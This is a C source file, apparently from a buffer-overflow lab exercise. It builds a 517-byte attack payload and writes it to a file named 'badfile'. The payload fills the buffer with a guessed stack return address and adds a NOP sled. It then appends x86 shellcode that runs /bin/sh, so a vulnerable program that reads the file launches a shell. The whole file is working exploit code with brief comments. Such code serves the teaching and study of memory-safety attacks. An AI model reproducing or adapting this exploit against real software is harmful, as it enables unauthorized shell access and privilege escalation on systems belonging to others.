/* exploit.c */

/*A program that creates a file containing code for launching shell*/
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

#define NOP 						0x90
#define BUFFER_SIZE					517
#define DEFAULT_OFFSET					0

char shellcode[]=
  "\x31\xc0\x50\x68""//sh\x68""/bin"
  "\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b"         
  "\xcd\x80";


void main(int argc, char *argv[]) {

	char *buffer;
	int offset = DEFAULT_OFFSET;
	char *ptr;
	long *addr_ptr, addr;
	FILE *badfile;
	long esp;

	/* Function to get the stack pointer */
	unsigned long get_sp(void) {
		__asm__("movl %esp, %eax");
	}

	/* Get user input for offset size. */
	if (argc > 1) offset = atoi(argv[1]);

	printf("Stack Pointer: 0x%lx\n", get_sp());

	/* Guess the address */
	esp = get_sp();
	addr = esp - offset;
	printf("Using address: 0x%lx\n", addr);


	buffer = malloc(BUFFER_SIZE);
	ptr = buffer;
	addr_ptr = (long *) ptr;

	int i;

	/* Fill up the entire buffer with the guessed return addr */
	for(i=0; i < BUFFER_SIZE; i+=4) { 
		*(addr_ptr++) = addr; 
	}

	/* 
		[ NOP SLED ]

		Important to make sure that the NOP sled is of multiples of 4, otherwise the bytes would be misalligned

		It is equally important to make sure that the NOP sled is not overwriting the return address of the original
		buffer.
	*/
	for(i=28; i < 260; i++) { 
	 	buffer[i] = NOP; 
	}

	/* Point the buffer at the end of the NOP sled */
	ptr = buffer + 260;

	for(i=0; i < strlen(shellcode); i++) {	 
		*(ptr++) = shellcode[i]; 
	}

	buffer[BUFFER_SIZE-1] = '\0';

	/* Save the contents to the file "badfile" */
	badfile = fopen("./badfile", "w");
	fwrite(buffer, BUFFER_SIZE, 1, badfile);
	fclose(badfile);
	free(buffer);
}
